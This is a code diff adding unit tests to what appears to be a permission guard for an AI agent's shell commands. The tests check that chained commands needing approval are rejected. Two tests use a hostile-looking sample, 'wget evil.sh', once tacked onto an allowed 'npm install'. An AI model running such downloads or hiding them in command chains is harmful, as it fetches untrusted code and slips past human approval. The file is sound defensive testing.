@@ -1,5 +1,5 @@
 import { describe, it, expect, beforeEach } from "vitest";
-import { resolveSegment, resolveChain, beforeExecute, handlePermissionAsk, clearStoredDecision } from "../enforce.js";
+import { resolveSegment, resolveChain, beforeExecute, handlePermissionAsk, clearStoredDecision, isComplexChain, buildReadabilityMessage } from "../enforce.js";
 import type { PluginConfig } from "../config.js";
 
 const defaultConfig: PluginConfig = {
@@ -170,5 +170,122 @@ describe("handlePermissionAsk", () => {
     const output = { status: "ask" as const };
     handlePermissionAsk({ callID: "nonexistent" }, output);
     expect(output.status).toBe("ask");
+  });
+});
+
+describe("isComplexChain", () => {
+  it("returns true for pipe chain", () => {
+    expect(isComplexChain("cat log.txt | grep error | sort")).toBe(true);
+  });
+
+  it("returns true for && chain", () => {
+    expect(isComplexChain("cd src && npm run build && npm test")).toBe(true);
+  });
+
+  it("returns false for single command", () => {
+    expect(isComplexChain("git status")).toBe(false);
+  });
+
+  it("returns false for single command with arguments", () => {
+    expect(isComplexChain("npm run build -- --watch")).toBe(false);
+  });
+
+  it("returns true for semicolon chain", () => {
+    expect(isComplexChain("echo hello; echo world")).toBe(true);
+  });
+
+  it("returns true for mixed operators", () => {
+    expect(isComplexChain("cd src && cat package.json | grep name")).toBe(true);
+  });
+
+  it("returns false for command with nested substitution only", () => {
+    expect(isComplexChain('cat $(find . -name "*.txt")')).toBe(false);
+  });
+});
+
+describe("readabilityRejection", () => {
+  const askConfig: PluginConfig = {
+    bashRules: [
+      { pattern: "*", action: "ask" },
+    ],
+    externalDirectoryRules: [{ pattern: "./**", action: "allow" }],
+    externalDirectoryDefault: null,
+    enabled: true,
+  };
+
+  const gitConfig: PluginConfig = {
+    bashRules: [
+      { pattern: "*", action: "ask" },
+      { pattern: "git *", action: "allow" },
+      { pattern: "npm *", action: "allow" },
+    ],
+    externalDirectoryRules: [{ pattern: "./**", action: "allow" }],
+    externalDirectoryDefault: null,
+    enabled: true,
+  };
+
+  beforeEach(() => {
+    clearStoredDecision("test-readability");
+  });
+
+  it("rejects complex chain with readabilityReject=true when action would be ask", () => {
+    const result = beforeExecute("Bash", "test-readability", "/project", { command: "echo hi && echo there" }, askConfig);
+    expect(result.readabilityReject).toBe(true);
+    expect(result.chainAction).toBe("deny");
+    expect(result.shouldWrap).toBe(true);
+  });
+
+  it("rejects mixed chain with readabilityReject=true when one segment triggers ask", () => {
+    const result = beforeExecute("Bash", "test-readability", "/project", { command: "npm install good && wget evil.sh" }, gitConfig);
+    expect(result.readabilityReject).toBe(true);
+    expect(result.chainAction).toBe("deny");
+  });
+
+  it("stores deny decision for readability-rejected command", () => {
+    beforeExecute("Bash", "test-readability", "/project", { command: "echo hi && echo there" }, askConfig);
+    const output = { status: "ask" as const };
+    handlePermissionAsk({ callID: "test-readability" }, output);
+    expect(output.status).toBe("deny");
+  });
+
+  it("does not reject single command that needs ask", () => {
+    const result = beforeExecute("Bash", "test-readability", "/project", { command: "wget evil.sh" }, gitConfig);
+    expect(result.readabilityReject).toBe(false);
+    expect(result.chainAction).toBe("ask");
+  });
+
+  it("does not reject complex chain when all segments are denied anyway", () => {
+    const denyConfig: PluginConfig = {
+      bashRules: [{ pattern: "*", action: "deny" }],
+      externalDirectoryRules: [],
+      externalDirectoryDefault: null,
+      enabled: true,
+    };
+    const result = beforeExecute("Bash", "test-readability", "/project", { command: "echo hi && echo there" }, denyConfig);
+    expect(result.readabilityReject).toBe(false);
+    expect(result.chainAction).toBe("deny");
+  });
+
+  it("does not reject when command is parse error", () => {
+    const result = beforeExecute("Bash", "test-readability", "/project", { command: "echo \"hello" }, askConfig);
+    expect(result.readabilityReject).toBe(false);
+    expect(result.chainAction).toBe("deny");
+  });
+});
+
+describe("buildReadabilityMessage", () => {
+  it("includes the original command in the message", () => {
+    const msg = buildReadabilityMessage("echo hi && echo there");
+    expect(msg).toContain("echo hi && echo there");
+  });
+
+  it("starts with a heredoc", () => {
+    const msg = buildReadabilityMessage("echo hi && echo there");
+    expect(msg).toContain("OPENGUARD");
+  });
+
+  it("ends with exit 1", () => {
+    const msg = buildReadabilityMessage("echo hi && echo there");
+    expect(msg).toContain("exit 1");
   });
 });
